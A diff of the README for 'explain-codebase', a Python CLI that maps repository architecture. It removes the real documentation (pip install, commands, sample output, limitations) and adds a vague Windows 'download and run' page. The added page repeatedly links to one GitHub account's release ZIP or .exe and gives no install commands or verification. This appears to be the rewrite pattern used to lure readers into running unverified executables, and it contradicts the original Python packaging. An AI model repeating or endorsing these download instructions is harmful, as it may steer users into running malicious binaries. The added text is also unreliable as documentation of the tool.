@@ -1,272 +1,206 @@
-# Explain Codebase
+# 🧭 explain-codebase - Understand any codebase fast
 
-CLI tool for quickly mapping the architecture of an unfamiliar repository.
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/Trampy021/explain-codebase)
 
-`explain-codebase` is a heuristic static-analysis CLI that helps developers find likely entrypoints, central modules, side-effect files, and risky areas in a codebase.
+## 🚀 What this tool does
 
-It is designed for onboarding and architecture review. It works with local folders and public GitHub repositories, and it aims to give you a useful architectural map quickly rather than perfectly understand every code path.
+**explain-codebase** is a command-line tool that reads a code repository and explains how it works.
 
-## Why
+It helps you see:
 
-When you open a new repository, the first questions are usually:
+- what the project does
+- where the app starts
+- how files depend on each other
+- how parts of the code connect
+- what may break when code changes
 
-- where execution starts
-- which modules are central
-- which files touch the database, network, filesystem, or cache
-- what files are risky to change
-- where to begin onboarding
+This is useful when you open a new project and need a quick map of the system.
 
-`explain-codebase` scans the project, builds a dependency graph, and turns those signals into a compact CLI summary.
+## 🖥️ Windows setup
 
-## Changelog
+Use the link below to visit the page to download:
 
-### v0.1.2
+[Download explain-codebase](https://github.com/Trampy021/explain-codebase)
 
-This release improves repository scanning by making the analyzer Git-aware.
+## 📦 What you need
 
-What's new:
+Before you run the tool on Windows, make sure you have:
 
-- supports `.gitignore`-aware scanning
-- analyzes only files tracked by Git when the target is a Git repository
-- ignores common noise directories such as `.venv`, `node_modules`, `dist`, `build`, `coverage`, and `__pycache__`
-- produces cleaner dependency graphs and more accurate architecture summaries
-- prevents generated and local-only files from polluting graph and report outputs
+- Windows 10 or Windows 11
+- an internet connection
+- enough free disk space for the app and your codebase
+- a terminal app such as PowerShell or Windows Terminal
 
-This makes the tool much more useful on real-world repositories by excluding ignored, temporary, and untracked files from the analysis.
+In most cases, the tool runs as a small command-line app. It does not need a full desktop install.
 
-### v0.1.4
+## 🔧 How to install
 
-Improved dependency graph visualization.
+1. Open the download page.
+2. Get the Windows file or release package from the repository page.
+3. Save it to a folder you can find again, such as Downloads or Desktop.
+4. If the file comes as a ZIP file, right-click it and choose Extract All.
+5. Open the folder that contains the app files.
+6. Keep the terminal window open for the next step.
 
-What’s new:
+If the repository includes a `.exe` file, you can run that file directly after download.
 
-- Redesigned dependency graph with a cleaner, more readable layout
-- Improved node spacing and reduced visual noise
-- Better handling of large repositories
-- Smoother interactions and graph rendering
+## ▶️ How to run it
 
-The graph is now easier to read and better represents the structure of real-world codebases.
+1. Open PowerShell or Windows Terminal.
+2. Go to the folder where you saved the tool.
+3. Run the app from that folder.
+4. Point it at the repository you want to study.
 
-## Installation
+A typical use looks like this:
 
-### Requirements
+- run the tool
+- give it the path to a project
+- wait while it scans the files
+- read the output in the terminal
 
-- Python 3.10+
-- Git, if you want to analyze remote GitHub repositories
-- Best current support: Python, JavaScript, and TypeScript repositories
+If the tool asks for a path, use a local folder like:
 
-### Install from PyPI
+- `C:\Users\YourName\Projects\MyApp`
+- `D:\Work\sample-repo`
 
-```bash
-pip install explain-codebase
-```
+## 🧠 What you will see
 
-### For local development
+The tool gives a simple view of the codebase. It can show:
 
-```bash
-pip install -e .[dev]
-```
+- the main entry file
+- important folders and files
+- libraries the project uses
+- relationships between files
+- where changes may spread
 
-## Commands
+This helps you answer questions like:
 
-### Overview
+- Where does this app start?
+- Which file handles setup?
+- What parts depend on this file?
+- What should I check before changing this code?
 
-Use this when you want a quick architectural snapshot of a repository:
+## 📁 Common workflow
 
-```bash
-explain-codebase .
-```
+A simple workflow is:
 
-### Detailed analysis
+1. Download the tool.
+2. Open your repository folder.
+3. Run the scanner.
+4. Read the architecture view.
+5. Check the dependency map.
+6. Review the change impact before editing code.
 
-Use verbose mode when you want to inspect the likely architecture structure in more detail:
+This can save time when you work in a new repo or hand off a project to someone else.
 
-```bash
-explain-codebase . --verbose
-```
+## 🧭 Best ways to use it
 
-Use deep mode when you want to focus on architectural risks and potential maintenance problems:
+Use **explain-codebase** when you need a fast read on a project before you edit code.
 
-```bash
-explain-codebase . --deep
-```
+Good times to run it:
 
-### File explanation
+- when you join a new team
+- when you inherit a project
+- before a big refactor
+- before you delete or rename files
+- when you need to trace a bug path
 
-Use this when you want to understand one specific file in project context:
+It works well for Python projects and other source trees that follow common file patterns.
 
-```bash
-explain-codebase file src/services/api_server.py
-```
+## 🛠️ Example output areas
 
-### Onboarding path
+You may see sections such as:
 
-Use this when a new developer needs a suggested reading order:
+- project overview
+- entrypoints
+- dependency graph
+- module map
+- file impact report
+- change risk notes
 
-```bash
-explain-codebase onboarding .
-```
+These names may vary, but the goal stays the same: show how the code is built and where it connects.
 
-### Graph and report
+## 📌 How to read the results
 
-Generate an interactive dependency graph:
+Start with the entrypoint. That is the file that launches the app.
 
-```bash
-explain-codebase . --graph
-```
+Then move to:
 
-Generate a full HTML architecture report:
+- config files
+- core modules
+- utility files
+- dependency list
 
-```bash
-explain-codebase . --report
-```
+If you plan to change one file, check which other files use it. That gives you a clear sense of impact.
 
-### CI mode
+## 🔍 Tips for first use
 
-Use this in CI when you want architecture issues to fail the build:
+- Start with a small repo if this is your first run.
+- Use a project you already know so the results feel easier to read.
+- Keep file paths simple.
+- Scan one repo at a time.
+- Save the output so you can compare it after changes.
 
-```bash
-explain-codebase . --ci
-```
+If the repo is large, let the scan finish before you close the terminal.
 
-## Example Output
+## 🧩 Typical project types
 
-### Default output
+This tool fits many codebases, such as:
 
-Default output is intentionally compact:
+- Python apps
+- CLI tools
+- backend services
+- internal developer tools
+- scripts and automation projects
+- repositories with layered modules
 
-```text
-Explain Codebase
---------------------------------
+It works best when the code has clear folder structure and import links.
 
-Repository
+## 📚 Repository topics
 
-  Path        C:\Projects\checkout-service
-  Type        Python backend service
-  Language    python
-  Files       7
+This project is tagged for:
 
-Architecture
+- cli
+- code-analysis
+- codebase-analysis
+- dependency-graph
+- developer-tools
+- onboarding
+- python
+- repository-analysis
+- software-architecture
+- static-analysis
 
-  Entrypoints        1
-  Core modules       5
-  Side effects       4
+These topics match the tool’s goal of helping users understand code structure with less effort
 
-Suggested starting point
+## 🧪 If something does not work
 
-  api_server.py
+Check these items first:
 
-Run with --verbose to see full architecture
-```
+- the file finished downloading
+- you opened the correct folder
+- the terminal is in the right path
+- the repo path is typed correctly
+- the folder has read access
 
-### Verbose output
+If the tool does not start, try running it again from the folder where the app file lives.
 
-Verbose mode adds more structure, including a likely execution path:
+## 🗂️ File and folder ideas
 
-```text
-Execution flow
+For a smooth setup, keep your files in a simple layout:
 
-api_server.py
-|- routes/order_routes.py
-|- services/order_service.py
-|  |- repositories/order_repository.py
-|  \- clients/warehouse_client.py
-\- middleware/auth_guard.py
-```
+- `Downloads\explain-codebase`
+- `Documents\repos\my-project`
+- `Desktop\tools\explain-codebase`
 
-This output is heuristic. It reflects likely structure based on static signals such as imports, naming conventions, and folder layout. It should be treated as a high-value map, not as guaranteed truth.
+This makes it easier to point the tool at the right repository path.
 
-## Features
+## 🔗 Download again
 
-- analyzes local folders and public GitHub repositories
-- detects project language and project type
-- attempts to detect likely entrypoints automatically
-- ranks central modules by dependency usage
-- surfaces likely execution paths
-- highlights modules that interact with database, network, filesystem, or cache
-- detects common architecture folders such as `services`, `repositories`, `routes`, and `models`
-- flags large modules and highly coupled files
-- highlights potential architecture issues such as circular dependencies
-- generates dependency graph visualizations
-- generates HTML architecture reports
-- explains a single file in project context
-- suggests onboarding reading paths
-- supports CI mode for architecture checks
+If you need the page again, use this link to visit the page to download:
 
-## Remote Repositories
+[https://github.com/Trampy021/explain-codebase](https://github.com/Trampy021/explain-codebase)
 
-You can analyze a public GitHub repository directly:
+## 🪄 When this is most useful
 
-```bash
-explain-codebase https://github.com/user/repo
-```
-
-For remote repositories, the tool:
-
-- supports public GitHub repository URLs
-- clones the repository into a temporary workspace
-- cleans up that workspace after analysis
-
-## How It Works
-
-At a high level, the tool:
-
-- scans source files in the target repository
-- detects language and likely project type
-- parses imports and builds a dependency graph
-- scores central modules using graph signals
-- surfaces likely entrypoints, side effects, hotspots, and onboarding hints
-- renders the result in CLI, JSON, and optional HTML outputs
-
-## Limitations
-
-- the analysis is heuristic, not full semantic understanding
-- best results come from Python, JavaScript, and TypeScript projects with conventional layouts
-- dynamic imports, reflection-heavy code, and runtime dependency injection may reduce accuracy
-- generated, vendored, or mirrored code can reduce signal quality
-- large monorepos may need path scoping or `--max-files` to keep output focused
-
-## CI Behavior
-
-CI mode is intended for lightweight architectural checks:
-
-```bash
-explain-codebase . --ci
-```
-
-Current behavior:
-
-- exit code `0` when no architecture issues are detected
-- exit code `1` when architecture issues are found
-- current issue types include circular dependencies and utility-style god modules
-- thresholds are currently built into the tool and are not yet configurable through CLI flags
-
-## JSON Output
-
-Use JSON output when you want to integrate the tool into scripts or pipelines:
-
-```bash
-explain-codebase . --json
-```
-
-The JSON output includes fields such as:
-
-- `project_type`
-- `entrypoints`
-- `core_modules`
-- `core_module_rankings`
-- `side_effect_modules`
-- `architecture_modules`
-- `large_files`
-- `hotspots`
-- `dangerous_files`
-- `architecture_issues`
-- `execution_flow`
-- `dependency_graph_output`
-- `html_report_output`
-
-## Tests
-
-```bash
-pytest
-```
+Use it when you want a quick, plain view of a codebase before you dive into the files. It helps you move from “What is this?” to “I can see how this works” without reading every file by hand
